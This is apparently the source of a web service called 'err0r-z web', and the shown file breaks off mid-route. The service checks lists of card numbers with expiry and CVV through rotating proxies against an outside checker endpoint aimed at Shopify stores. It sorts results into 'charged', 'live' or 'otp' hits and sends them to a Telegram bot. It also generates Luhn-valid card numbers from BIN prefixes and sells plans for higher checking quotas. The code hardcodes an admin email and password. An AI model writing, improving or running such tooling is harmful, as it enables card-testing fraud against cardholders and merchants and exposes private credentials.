# ─────────────────────────────────────────────────────────────────────────────
# 𒉼 𝔢 𝔯 𝔯 𝔬 𝔯 乙  — WEB
# ─────────────────────────────────────────────────────────────────────────────
import os, sys, json, time, uuid, hmac, hashlib, base64, random, string, sqlite3, threading, asyncio, re
from datetime import datetime, timezone, timedelta
from typing import Optional, List, Dict, Any

import aiohttp
from fastapi import FastAPI, Request, HTTPException, Depends, Header
from fastapi.responses import HTMLResponse, FileResponse, JSONResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

# ── Config ───────────────────────────────────────────────────────────────────
SECRET_KEY  = os.getenv("SECRET_KEY", "err0r-z-change-me")
DB_PATH     = os.getenv("DB_PATH", "err0r.db")
PORT        = int(os.getenv("PORT", 8000))

ADMIN_EMAIL = "yousafcodes.de@gmail.com"
ADMIN_PASS  = "03283877877@_1"

# ── DB ───────────────────────────────────────────────────────────────────────
_db_lock = threading.RLock()
_conn: Optional[sqlite3.Connection] = None

def _get_conn():
    global _conn
    if _conn is None:
        os.makedirs(os.path.dirname(DB_PATH) or ".", exist_ok=True)
        _conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
        _conn.row_factory = sqlite3.Row
        _conn.execute("PRAGMA journal_mode=WAL")
        _conn.execute("PRAGMA synchronous=NORMAL")
        _conn.execute("PRAGMA busy_timeout=30000")
    return _conn

def q(sql: str, params: tuple = ()) -> List[sqlite3.Row]:
    with _db_lock:
        return _get_conn().execute(sql, params).fetchall()

def q1(sql: str, params: tuple = ()) -> Optional[sqlite3.Row]:
    with _db_lock:
        return _get_conn().execute(sql, params).fetchone()

def ex(sql: str, params: tuple = ()) -> int:
    with _db_lock:
        c = _get_conn().execute(sql, params)
        _get_conn().commit()
        return c.lastrowid or c.rowcount

def init_db():
    with _db_lock:
        _get_conn().executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            name TEXT DEFAULT '',
            is_admin INTEGER DEFAULT 0,
            plan TEXT DEFAULT 'free',
            plan_expires TEXT DEFAULT '',
            credits INTEGER DEFAULT 50,
            daily_checks INTEGER DEFAULT 0,
            total_checks INTEGER DEFAULT 0,
            total_hits INTEGER DEFAULT 0,
            last_check_date TEXT DEFAULT '',
            banned INTEGER DEFAULT 0,
            created_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS settings (
            key TEXT PRIMARY KEY, value TEXT
        );
        CREATE TABLE IF NOT EXISTS apis (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT DEFAULT '',
            url TEXT NOT NULL,
            style TEXT DEFAULT 'params',
            site_required INTEGER DEFAULT 0,
            cap INTEGER DEFAULT 900,
            enabled INTEGER DEFAULT 1,
            api_key TEXT DEFAULT '',
            created_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS proxies (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL,
            proxy TEXT NOT NULL,
            status TEXT DEFAULT 'unknown',
            latency REAL DEFAULT 0,
            checked_at TEXT DEFAULT '',
            UNIQUE(user_id, proxy)
        );
        CREATE TABLE IF NOT EXISTS jobs (
            id TEXT PRIMARY KEY,
            user_id INTEGER NOT NULL,
            name TEXT DEFAULT '',
            status TEXT DEFAULT 'queued',
            total INTEGER DEFAULT 0,
            done INTEGER DEFAULT 0,
            live INTEGER DEFAULT 0,
            declined INTEGER DEFAULT 0,
            otp INTEGER DEFAULT 0,
            unknown INTEGER DEFAULT 0,
            created_at TEXT DEFAULT '',
            finished_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS cards (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            job_id TEXT NOT NULL,
            user_id INTEGER NOT NULL,
            cc TEXT NOT NULL,
            status TEXT DEFAULT 'pending',
            response TEXT DEFAULT '',
            amount REAL DEFAULT 0,
            currency TEXT DEFAULT 'USD',
            gateway TEXT DEFAULT '',
            site TEXT DEFAULT '',
            checked_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS charged (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER DEFAULT 0,
            cc TEXT, response TEXT, amount REAL, currency TEXT DEFAULT 'USD',
            gateway TEXT, site TEXT, ts TEXT
        );
        CREATE TABLE IF NOT EXISTS redeem_codes (
            code TEXT PRIMARY KEY,
            plan TEXT, max_uses INTEGER, used INTEGER DEFAULT 0, days INTEGER DEFAULT 30
        );
        CREATE TABLE IF NOT EXISTS notifications (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER DEFAULT 0,
            text TEXT, ts TEXT, read INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS sites (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT UNIQUE
        );
        """)
        # seed admin
        existing = _get_conn().execute("SELECT id FROM users WHERE email=?", (ADMIN_EMAIL,)).fetchone()
        if not existing:
            _get_conn().execute(
                "INSERT INTO users(email, password, name, is_admin, plan, plan_expires, credits, created_at) VALUES (?,?,?,?,?,?,?,?)",
                (ADMIN_EMAIL, _hash(ADMIN_PASS), "Admin", 1, "unlimited", "", 999999, _now())
            )
        # seed api
        if not _get_conn().execute("SELECT id FROM apis LIMIT 1").fetchone():
            _get_conn().execute(
                "INSERT INTO apis(name, url, style, site_required, cap, enabled, created_at) VALUES (?,?,?,?,?,?,?)",
                ("default", "http://107.148.78.54:8083/shopify", "raw", 0, 900, 1, _now())
            )
        # default settings
        for k, v in [
            ("bot_token", ""),
            ("admin_chat_id", ""),
            ("job_concurrency", "15"),
            ("maintenance", "0"),
            ("notify_on_hit", "1"),
        ]:
            _get_conn().execute("INSERT OR IGNORE INTO settings(key, value) VALUES (?,?)", (k, v))
        _get_conn().commit()

def _now() -> str:
    return datetime.now(timezone.utc).isoformat()

# ── Auth helpers ─────────────────────────────────────────────────────────────
def _hash(pw: str) -> str:
    salt = b"err0r-z-static-salt-v1"
    return hashlib.pbkdf2_hmac("sha256", pw.encode(), salt, 120000).hex()

def _verify(pw: str, hashed: str) -> bool:
    return hmac.compare_digest(_hash(pw), hashed)

def _make_token(uid: int) -> str:
    exp = int(time.time()) + 86400 * 30
    payload = f"{uid}.{exp}"
    sig = hmac.new(SECRET_KEY.encode(), payload.encode(), hashlib.sha256).hexdigest()[:32]
    raw = f"{payload}.{sig}"
    return base64.urlsafe_b64encode(raw.encode()).decode()

def _verify_token(token: str) -> Optional[int]:
    try:
        raw = base64.urlsafe_b64decode(token.encode()).decode()
        uid, exp, sig = raw.split(".")
        if int(exp) < time.time():
            return None
        expected = hmac.new(SECRET_KEY.encode(), f"{uid}.{exp}".encode(), hashlib.sha256).hexdigest()[:32]
        if not hmac.compare_digest(sig, expected):
            return None
        return int(uid)
    except Exception:
        return None

def _user_from(request: Request):
    auth = request.headers.get("authorization", "")
    if not auth.startswith("Bearer "):
        raise HTTPException(401, "no token")
    uid = _verify_token(auth[7:])
    if not uid:
        raise HTTPException(401, "bad token")
    row = q1("SELECT * FROM users WHERE id=?", (uid,))
    if not row or row["banned"]:
        raise HTTPException(401, "banned")
    return dict(row)

def _admin(user=Depends(_user_from)):
    if not user["is_admin"]:
        raise HTTPException(403, "admin only")
    return user

def _settings_all() -> Dict[str, str]:
    return {r["key"]: r["value"] for r in q("SELECT * FROM settings")}

def _set_setting(k: str, v: str):
    ex("INSERT INTO settings(key,value) VALUES (?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value", (k, str(v)))

# ── CC utils ─────────────────────────────────────────────────────────────────
CC_RE = re.compile(r"^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$")

def normalize_cc(raw: str) -> Optional[str]:
    if not raw:
        return None
    s = re.sub(r"[\s:;,/\-]+", "|", raw.strip())
    parts = [p for p in s.split("|") if p]
    if len(parts) != 4:
        return None
    num, mm, yy, cvv = (re.sub(r"\D", "", x) for x in parts)
    if not (num and mm and yy and cvv) or not (13 <= len(num) <= 19):
        return None
    if len(yy) == 4:
        yy = yy[2:]
    cc = f"{num}|{mm.zfill(2)[:2]}|{yy.zfill(2)[:2]}|{cvv.zfill(3)[:4]}"
    return cc if CC_RE.match(cc) else None

def luhn_ok(card: str) -> bool:
    if not card.isdigit():
        return False
    total, rev = 0, card[::-1]
    for i, ch in enumerate(rev):
        d = ord(ch) - 48
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        total += d
    return total % 10 == 0

def complete_luhn(prefix: str, length: int) -> str:
    body = prefix + "".join(random.choices(string.digits, k=length - len(prefix) - 1))
    for d in "0123456789":
        if luhn_ok(body + d):
            return body + d
    return body + "0"

def generate_cc(bin_prefix: str, month: str, year: str, cvv: str, count: int) -> List[str]:
    out = []
    for _ in range(count):
        length = 15 if bin_prefix.startswith(("34", "37")) else 16
        num = complete_luhn(bin_prefix or "4", length)
        mm = month if month and month != "random" else f"{random.randint(1,12):02d}"
        yy = year if year and year != "random" else f"{random.randint(26,32):02d}"
        cvv_ = cvv if cvv and cvv != "random" else f"{random.randint(0,999):03d}"
        out.append(f"{num}|{mm}|{yy}|{cvv_}")
    return out

# ── Response classification ─────────────────────────────────────────────────
CHARGED_KW = ("ORDER_PLACED", "ORDER_PAID", "PAYMENT_SUCCESSFULL", "PAYMENT_CAPTURED", "PAYMENT_COMPLETED")
NSF_KW     = ("INSUFFICIENT_FUNDS", "NSF", "INSUFFICIENT FUNDS")
CCN_KW     = ("INCORRECT_CVC", "INVALID_CVC", "WRONG_CVV", "INCORRECT_ZIP", "CVV")
OTP_KW     = ("OTP", "3DS", "3D_SECURE", "3D SECURE", "AUTHENTICATION_REQUIRED", "OTP_REQUIRED")
DECLINE_KW = ("DECLINED", "DECLINE", "DO_NOT_HONOR", "DO_NOT_HONOUR", "GENERIC_DECLINE", "FRAUDULENT",
              "SUSPECTED_FRAUD", "STOLEN_CARD", "LOST_CARD", "PICKUP_CARD", "EXPIRED_CARD", "CARD_EXPIRED",
              "RESTRICTED_CARD", "CARD_NOT_SUPPORTED", "TRANSACTION_NOT_ALLOWED", "NOT_PERMITTED",
              "BLOCKED_CARD", "BIN_BLOCKED", "INVALID_ACCOUNT", "CARD_NOT_ACTIVE", "INVALID_NUMBER",
              "INCORRECT_NUMBER", "INVALID_CARD", "AUTHENTICATION_FAILED", "AUTHORIZATION_FAILED")

def classify(resp_text: str, http_status: int = 200) -> Dict[str, Any]:
    raw = (resp_text or "").strip()
    up = raw.upper()
    if http_status >= 500:
        return {"cls": "unknown", "response": f"HTTP {http_status}", "amount": 0.0, "currency": "USD", "gateway": ""}
    data = {}
    if raw.startswith(("{", "[")):
        try:
            p = json.loads(raw)
            if isinstance(p, list) and p and isinstance(p[0], dict):
                data = p[0]
            elif isinstance(p, dict):
                data = p
        except Exception:
            pass
    charged = str(data.get("Charged", "False")).strip().lower() == "true"
    approved = str(data.get("Approved", "False")).strip().lower() == "true"
    resp_msg = str(data.get("Response", data.get("response", data.get("message", data.get("error", "")))) or "").strip() or raw[:200] or "unknown"
    gateway = str(data.get("Gate", data.get("Gateway", "")) or "").strip()
    price_raw = str(data.get("Price", data.get("price", "0")) or "0")
    amount, currency = 0.0, "USD"
    pp = price_raw.strip().split()
    if pp:
        try:
            amount = float(pp[0].replace("$", "").replace("?", "0"))
        except Exception:
            pass
        if len(pp) > 1 and pp[1].isalpha():
            currency = pp[1].upper()
    ru = resp_msg.upper()
    if charged or any(k in ru for k in CHARGED_KW):
        cls = "charged"
    elif any(k in ru for k in OTP_KW):
        cls = "otp"
    elif any(k in ru for k in NSF_KW) or any(k in ru for k in CCN_KW):
        cls = "live"
    elif approved:
        cls = "live"
    elif any(k in ru for k in DECLINE_KW):
        cls = "declined"
    else:
        cls = "declined"
    return {"cls": cls, "response": resp_msg[:200], "amount": amount, "currency": currency, "gateway": gateway}

def is_hit(cls: str) -> bool:
    return cls in ("charged", "live", "otp")

# ── Proxy validation ─────────────────────────────────────────────────────────
def _proxy_url(p: str) -> str:
    p = p.strip()
    if "://" in p:
        return p
    parts = p.split(":")
    if len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"http://{p}"

async def test_proxy(proxy: str) -> Dict[str, Any]:
    start = time.time()
    try:
        url = _proxy_url(proxy)
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(force_close=True, ssl=False)) as s:
            async with s.get("https://api.ipify.org", proxy=url, timeout=aiohttp.ClientTimeout(total=12)) as r:
                body = await r.text(errors="ignore")
                if r.status == 200 and any(c.isdigit() for c in body):
                    return {"ok": True, "latency": round(time.time() - start, 2)}
                return {"ok": False, "latency": round(time.time() - start, 2)}
    except Exception:
        return {"ok": False, "latency": 0}

# ── Telegram ────────────────────────────────────────────────────────────────
async def tg_send(text: str):
    st = _settings_all()
    token = st.get("bot_token", "").strip()
    chat = st.get("admin_chat_id", "").strip()
    if not token or not chat:
        return
    try:
        async with aiohttp.ClientSession() as s:
            await s.post(f"https://api.telegram.org/bot{token}/sendMessage",
                         json={"chat_id": chat, "text": text, "parse_mode": "HTML", "disable_web_page_preview": True},
                         timeout=aiohttp.ClientTimeout(total=10))
    except Exception:
        pass

def _fmt_hit(cc: str, res: Dict[str, Any], user_email: str) -> str:
    masked = cc[:6] + "**|**|**|***"
    return (
        f"<b>💳 HIT · {res.get('cls','').upper()}</b>\n"
        f"<code>{masked}</code>\n"
        f"Response: <b>{res.get('response','')}</b>\n"
        f"Amount: <b>${res.get('amount',0):.2f} {res.get('currency','USD')}</b>\n"
        f"Gateway: {res.get('gateway','')}\n"
        f"User: {user_email}"
    )

# ── Checker core ────────────────────────────────────────────────────────────
async def check_one(card: str, proxy: Optional[str], endpoint: Dict[str, Any], site: Optional[str]) -> Dict[str, Any]:
    base = endpoint["url"]
    style = endpoint.get("style", "params")
    key = endpoint.get("api_key") or ""
    api_site = site if not site or site.startswith("http") else f"https://{site}"
    if style == "raw":
        parts = [card]
        if proxy:
            parts.append(f"proxy={proxy}")
        if api_site:
            parts.append(f"site={api_site}")
        if key:
            parts.append(f"key={key}")
        sep = "&" if "?" in base else "?"
        url = base + sep + "&".join(parts)
        params = None
    else:
        url = base
        params = {"cc": card, "proxy": proxy or ""}
        if api_site:
            params["site"] = api_site
        if key:
            params["key"] = key
    proxy_url = _proxy_url(proxy) if proxy else None
    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=200, ssl=False)) as s:
            async with s.get(url, params=params, proxy=proxy_url,
                             timeout=aiohttp.ClientTimeout(total=30, connect=8, sock_read=22)) as r:
                body = await r.text(errors="ignore")
                res = classify(body, r.status)
                res["site"] = site or ""
                return res
    except asyncio.TimeoutError:
        return {"cls": "unknown", "response": "timeout", "amount": 0.0, "currency": "USD", "gateway": ""}
    except Exception as e:
        return {"cls": "unknown", "response": str(e)[:120], "amount": 0.0, "currency": "USD", "gateway": ""}

async def run_job(job_id: str):
    job = q1("SELECT * FROM jobs WHERE id=?", (job_id,))
    if not job:
        return
    user = q1("SELECT * FROM users WHERE id=?", (job["user_id"],))
    if not user:
        return
    cards = q("SELECT * FROM cards WHERE job_id=? AND status='pending'", (job_id,))
    if not cards:
        ex("UPDATE jobs SET status='done', finished_at=? WHERE id=?", (_now(), job_id))
        return

    apis = [dict(a) for a in q("SELECT * FROM apis WHERE enabled=1")]
    if not apis:
        for c in cards:
            ex("UPDATE cards SET status='unknown', response='no APIs enabled', checked_at=? WHERE id=?", (_now(), c["id"]))
        ex("UPDATE jobs SET status='done', done=total, unknown=total, finished_at=? WHERE id=?", (_now(), job_id))
        return

    proxies = [r["proxy"] for r in q("SELECT proxy FROM proxies WHERE user_id=? AND status='live'", (user["id"],))]
    sites = [r["url"] for r in q("SELECT url FROM sites")]
    st = _settings_all()
    conc = max(1, int(st.get("job_concurrency", "15") or 15))
    sem = asyncio.Semaphore(conc)
    proxy_idx = [0]

    def next_proxy():
        if not proxies:
            return None
        p = proxies[proxy_idx[0] % len(proxies)]
        proxy_idx[0] += 1
        return p

    counts = {"live": 0, "declined": 0, "otp": 0, "unknown": 0}
    hit_lock = asyncio.Lock()

    async def worker(card_row):
        async with sem:
            ep = random.choice(apis)
            proxy = next_proxy()
            site = random.choice(sites) if sites and ep.get("site_required") else None
            res = await check_one(card_row["cc"], proxy, ep, site)
            cls = res["cls"]
            async with hit_lock:
                counts[cls] = counts.get(cls, 0) + 1
                ex(
                    "UPDATE cards SET status=?, response=?, amount=?, currency=?, gateway=?, site=?, checked_at=? WHERE id=?",
                    (cls, res["response"], res["amount"], res["currency"], res["gateway"], res.get("site", ""), _now(), card_row["id"])
                )
                ex("UPDATE jobs SET done=done+1, live=?, declined=?, otp=?, unknown=? WHERE id=?",
                   (counts["live"], counts["declined"], counts["otp"], counts["unknown"], job_id))
                if is_hit(cls):
                    ex("UPDATE users SET total_hits=total_hits+1 WHERE id=?", (user["id"],))
                    ex("INSERT INTO charged(user_id, cc, response, amount, currency, gateway, site, ts) VALUES (?,?,?,?,?,?,?,?)",
                       (user["id"], card_row["cc"], res["response"], res["amount"], res["currency"], res["gateway"], res.get("site", ""), _now()))
                    if st.get("notify_on_hit", "1") == "1":
                        asyncio.create_task(tg_send(_fmt_hit(card_row["cc"], res, user["email"])))

    tasks = [asyncio.create_task(worker(c)) for c in cards]
    await asyncio.gather(*tasks, return_exceptions=True)
    ex("UPDATE jobs SET status='done', finished_at=? WHERE id=?", (_now(), job_id))

async def worker_loop():
    await asyncio.sleep(2)
    while True:
        try:
            job = q1("SELECT id FROM jobs WHERE status='queued' ORDER BY created_at LIMIT 1")
            if job:
                ex("UPDATE jobs SET status='running' WHERE id=?", (job["id"],))
                await run_job(job["id"])
        except Exception as e:
            print(f"[worker] {e}", flush=True)
        await asyncio.sleep(2)

# ── FastAPI app ─────────────────────────────────────────────────────────────
app = FastAPI(title="err0r-z web")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

@app.on_event("startup")
async def _startup():
    init_db()
    ex("UPDATE jobs SET status='queued' WHERE status='running'")
    asyncio.create_task(worker_loop())
    print("[boot] err0r-z web ready", flush=True)

# ── Models ──────────────────────────────────────────────────────────────────
class LoginIn(BaseModel):
    email: str
    password: str

class ProxyIn(BaseModel):
    proxies: List[str]

class StartIn(BaseModel):
    cards: List[str]
    name: str = ""

class UserCreateIn(BaseModel):
    email: str
    password: str
    name: str = ""
    plan: str = "free"
    credits: int = 50

class UserUpdateIn(BaseModel):
    plan: Optional[str] = None
    credits: Optional[int] = None
    banned: Optional[int] = None
    password: Optional[str] = None

class ApiIn(BaseModel):
    name: str = ""
    url: str
    style: str = "params"
    site_required: int = 0
    cap: int = 900
    api_key: str = ""
    enabled: int = 1

class CodeIn(BaseModel):
    plan: str
    uses: int
    days: int

class SettingIn(BaseModel):
    key: str
    value: str

class NotifyIn(BaseModel):
    user_id: int = 0
    text: str

class RedeemIn(BaseModel):
    code: str

class GenIn(BaseModel):
    bin: str = "4"
    month: str = "random"
    year: str = "random"
    cvv: str = "random"
    count: int = 10

# ── Routes ──────────────────────────────────────────────────────────────────
@app.get("/", response_class=HTMLResponse)
async def index():
    path = os.path.join(os.path.dirname(__file__), "templates", "index.html")
    if os.path.exists(path):
        return FileResponse(path, media_type="text/html")
    return HTMLResponse("<h1>template missing</h1>", status_code=500)

@app.post("/api/auth/login")
async def login(body: LoginIn):
    row = q1("SELECT * FROM users WHERE email=?", (body.email.strip().lower(),))
    if not row or not _verify(body.password, row["password"]):
        raise HTTPException(401, "invalid credentials")
    if row["banned"]:
        raise HTTPException(403, "banned")
    return {"token": _make_token(row["id"]), "user": _pub_user(row)}

def _pub_user(r) -> Dict[str, Any]:
    d = dict(r)
    d.pop("password", None)
    return d

@app.get("/api/me")
async def me(user=Depends(_user_from)):
    return _pub_user(_get_user_row(user["id"]))

def _get_user_row(uid: int):
    return q1("SELECT * FROM users WHERE id=?", (uid,))

@app.get("/api/stats")
async def stats(user=Depends(_user_from)):
    jobs = q("SELECT * FROM jobs WHERE user_id=?", (user["id"],))
    total = sum(j["total"] for j in jobs)
    live = sum(j["live"] for j in jobs)
    declined = sum(j["declined"] for j in jobs)
    otp = sum(j["otp"] for j in jobs)
    return {"total": total, "live": live, "declined": declined, "otp": otp}

# ── Proxies ─────────────────────────────────────────────────────────────────
@app.get("/api/proxies")
async def list_proxies(user=Depends(_user_from)):
    rows = q("SELECT * FROM proxies WHERE user_id=? ORDER BY id DESC", (user["id"],))
    return [dict(r) for r in rows]

@app.post("/api/proxies/validate")
async def validate_proxies(body: ProxyIn, user=Depends(_user_from)):
    existing = {r["proxy"] for r in q("SELECT proxy FROM proxies WHERE user_id=?", (user["id"],))}
    new = [p.strip() for p in body.proxies if p.strip() and p.strip() not in existing]
    if not new:
        return {"tested": 0, "live": 0, "dead": 0}
    results = await asyncio.gather(*[test_proxy(p) for p in new])
    live = 0
    for p, r in zip(new, results):
        if r["ok"]:
            live += 1
            ex("INSERT OR REPLACE INTO proxies(user_id, proxy, status, latency, checked_at) VALUES (?,?,?,?,?)",
               (user["id"], p, "live", r["latency"], _now()))
    return {"tested": len(new), "live": live, "dead": len(new) - live}

@app.delete("/api/proxies/{pid}")
async def del_proxy(pid: int, user=Depends(_user_from)):
    ex("DELETE FROM proxies WHERE id=? AND user_id=?", (pid, user["id"]))
    return {"ok": True}

@app.delete("/api/proxies")
async def clear_proxies(user=Depends(_user_from)):
    ex("DELETE FROM proxies WHERE user_id=?", (user["id"],))
    return {"ok": True}

# ── Jobs / Checking ─────────────────────────────────────────────────────────
@app.post("/api/check/start")
async def start_check(body: StartIn, user=Depends(_user_from)):
    if _settings_all().get("maintenance") == "1" and not user["is_admin"]:
        raise HTTPException(503, "maintenance")
    apis = q("SELECT id FROM apis WHERE enabled=1")
    if not apis:
        raise HTTPException(400, "no APIs enabled — ask admin")
    live_proxies = q("SELECT id FROM proxies WHERE user_id=? AND status='live' LIMIT 1", (user["id"],))
    if not live_proxies and not user["is_admin"]:
        raise HTTPException(400, "add and validate proxies first")
    cards = []
    seen = set()
    for c in body.cards:
        n = normalize_cc(c)
        if n and n not in seen:
            seen.add(n)
            cards.append(n)
    if not cards:
        raise HTTPException(400, "no valid cards")
    if not user["is_admin"]:
        plan = user["plan"]
        mass_limit = {"free": 100, "pro": 2000, "premium": 5000, "max": 10000, "unlimited": 20000}.get(plan, 100)
        if len(cards) > mass_limit:
            raise HTTPException(400, f"batch limit for {plan} is {mass_limit} — upgrade to send more")
        # quota
        today = datetime.now(timezone.utc).date().isoformat()
        if user["last_check_date"] != today:
            ex("UPDATE users SET daily_checks=0, last_check_date=? WHERE id=?", (today, user["id"]))
        daily_limit = {"free": 1000, "pro": 5000, "premium": 10000, "max": 30000, "unlimited": 999999}.get(plan, 1000)
        used = q1("SELECT daily_checks FROM users WHERE id=?", (user["id"],))["daily_checks"]
        remaining = daily_limit - used
        if remaining <= 0:
            raise HTTPException(400, "daily limit reached — upgrade or wait")
        cards = cards[:min(len(cards), remaining)]
        ex("UPDATE users SET daily_checks=daily_checks+?, total_checks=total_checks+? WHERE id=?",
           (len(cards), len(cards), user["id"]))

    job_id = uuid.uuid4().hex[:12]
    ex("INSERT INTO jobs(id, user_id, name, status, total, created_at) VALUES (?,?,?,?,?,?)",
       (job_id, user["id"], body.name or f"Job {job_id[:6]}", "queued", len(cards), _now()))
    for cc in cards:
        ex("INSERT INTO cards(job_id, user_id, cc) VALUES (?,?,?)", (job_id, user["id"], cc))
    return {"job_id": job_id, "total": len(cards)}

@app.get("/api/jobs")
async def list_jobs(user=Depends(_user_from)):
    rows = q("SELECT * FROM jobs WHERE user_id=? ORDER BY created_at DESC LIMIT 50", (user["id"],))
    return [dict(r) for r in rows]

@app.get("/api/jobs/{job_id}")
async def get_job(job_id: str, user=Depends(_user_from)):
    j = q1("SELECT * FROM jobs WHERE id=? AND user_id=?", (job_id, user["id"]))
    if not j:
        raise HTTPException(404, "not found")
    cards = q("SELECT cc, status, response, amount, currency, gateway, site FROM cards WHERE job_id=? ORDER BY id", (job_id,))
    return {"job": dict(j), "cards": [dict(c) for c in cards]}

@app.delete("/api/jobs/{job_id}")
async def del_job(job_id: str, user=Depends(_user_from)):
    ex("DELETE FROM cards WHERE job_id=? AND user_id=?", (job_id, user["id"]))
    ex("DELETE FROM jobs WHERE id=? AND user_id=?", (job_id, user["id"]))
    return {"ok": True}

# ── Hits ────────────────────────────────────────────────────────────────────
@app.get("/api/hits")
async def my_hits(user=Depends(_user_from)):
    rows = q("SELECT * FROM charged WHERE user_id=? ORDER BY id DESC", (user["id"],))
    return [dict(r) for r in rows]

@app.delete("/api/hits/{hid}")
async def del_hit(hid: int, user=Depends(_user_from)):
    ex("DELETE FROM charged WHERE id=? AND user_id=?", (hid, user["id"]))
    return {"ok": True}

@app.delete("/api/hits")
async def clear_hits(user=Depends(_user_from)):
    ex("DELETE FROM charged WHERE user_id=?", (user["id"],))
    return {"ok": True}

# ── CC gen ──────────────────────────────────────────────────────────────────
@app.post("/api/cc/gen")
async def cc_gen(body: GenIn, user=Depends(_user_from)):
    return {"cards": generate_cc(body.bin, body.month, body.year, body.cvv, min(500, max(1, body.count)))}

# ── Redeem ──────────────────────────────────────────────────────────────────
@app.post("/api/redeem")
async def redeem(body: RedeemIn, user=Depends(_user_from)):
    code = body.code.strip().upper()
    row = q1("SELECT * FROM redeem_codes WHERE code=?", (code,))
    if not row:
        raise HTTPException(400, "invalid code")
    if row["used"] >= row["max_uses"]:
        raise HTTPException(400, "code exhausted")
    days = row["days"]
    exp = (datetime.now(timezone.utc) + timedelta(days=days)).isoformat()
    ex("UPDATE users SET plan=?, plan_expires=? WHERE id=?", (row["plan"], exp, user["id"]))
    ex("UPDATE redeem_codes SET used=used+1 WHERE code=?", (code,))
    return {"ok": True, "plan": row["plan"], "days": days}

# ── Notifications ───────────────────────────────────────────────────────────
@app.get("/api/notifications")
async def get_notifs(user=Depends(_user_from)):
    rows = q("SELECT * FROM notifications WHERE user_id IN (0,?) ORDER BY id DESC LIMIT 30", (user["id"],))
    return [dict(r) for r in rows]

@app.post("/api/notifications/read")
async def read_notifs(user=Depends(_user_from)):
    ex("UPDATE notifications SET read=1 WHERE user_id IN (0,?)", (user["id"],))
    return {"ok": True}

# ── ADMIN ───────────────────────────────────────────────────────────────────
@app.get("/api/admin/users")
async def admin_users(user=Depends(_admin)):
    return [_pub_user(r) for r in q("SELECT * FROM users ORDER BY id DESC")]

@app.post("/api/admin/users")
async def admin_create_user(body: UserCreateIn, user=Depends(_admin)):
    email = body.email.strip().lower()
    if q1("SELECT id FROM users WHERE email=?", (email,)):
        raise HTTPException(400, "email exists")
    uid = ex("INSERT INTO users(email, password, name, plan, credits, created_at) VALUES (?,?,?,?,?,?)",
             (email, _hash(body.password), body.name, body.plan, body.credits, _now()))
    return {"id": uid}

@app.put("/api/admin/users/{uid}")
async def admin_update_user(uid: int, body: UserUpdateIn, user=Depends(_admin)):
    sets, params = [], []
    if body.plan is not None:
        sets.append("plan=?"); params.append(body.plan)
    if body.credits is not None:
        sets.append("credits=?"); params.append(body.credits)
    if body.banned is not None:
        sets.append("banned=?"); params.append(body.banned)
    if body.password is not None:
        sets.append("password=?"); params.append(_hash(body.password))
    if not sets:
        return {"ok": True}
    params.append(uid)
    ex(f"UPDATE users SET {','.join(sets)} WHERE id=?", tuple(params))
    return {"ok": True}

@app.delete("/api/admin/users/{uid}")
async def admin_del_user(uid: int, user=Depends(_admin)):
    ex("DELETE FROM users WHERE id=? AND is_admin=0", (uid,))
    return {"ok": True}

@app.get("/api/admin/apis")
async def admin_apis(user=Depends(_admin)):
    return [dict(r) for r in q("SELECT * FROM apis ORDER BY id")]

@app.post("/api/admin/apis")
async def admin_add_api(body: ApiIn, user=Depends(_admin)):
    aid = ex("INSERT INTO apis(name, url, style, site_required, cap, enabled, api_key, created_at) VALUES (?,?,?,?,?,?,?,?)",
             (body.name, body.url, body.style, body.site_required, body.cap, body.enabled, body.api_key, _now()))
    return {"id": aid}

@app.put("/api/admin/apis/{aid}")
async def admin_upd_api(aid: int, body: ApiIn, user=Depends(_admin)):
    ex("UPDATE apis SET name=?, url=?, style=?, site_required=?, cap=?, enabled=?, api_key=? WHERE id=?",
       (body.name, body.url, body.style, body.site_required, body.cap, body.enabled, body.api_key, aid))
    return {"ok": True}

@app.delete("/api/admin/apis/{aid}")
async def admin_del_api(aid: int, user=Depends(_admin)):
    ex("DELETE FROM apis WHERE id=?", (aid,))
    return {"ok": True}

@app.get("/api/admin/charged")
async def admin_charged(user=Depends(_admin)):
    rows = q("SELECT c.*, u.email as user_email FROM charged c LEFT JOIN users u ON u.id=c.user_id ORDER BY c.id DESC LIMIT 500")
    return [dict(r) for r in rows]

@app.delete("/api/admin/charged")
async def admin_clear_charged(user=Depends(_admin)):
    ex("DELETE FROM charged")
    return {"ok": True}

@app.get("/api/admin/jobs")
async def admin_jobs(user=Depends(_admin)):
    rows = q("SELECT j.*, u.email as user_email FROM jobs j LEFT JOIN users u ON u.id=j.user_id ORDER BY j.created_at DESC LIMIT 100")
    return [dict(r) for r in rows]

@app.get("/api/admin/codes")
async def admin_codes(user=Depends(_admin)):
    return [dict(r) for r in q("SELECT * FROM redeem_codes ORDER BY code DESC")]

@app.post("/api/admin/codes")
async def admin_create_code(body: CodeIn, user=Depends(_admin)):
    code = "ERR0R-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=6))
    ex("INSERT INTO redeem_codes(code, plan, max_uses, days) VALUES (?,?,?,?)",
       (code, body.plan, body.uses, body.days))
    return {"code": code}

@app.delete("/api/admin/codes/{code}")
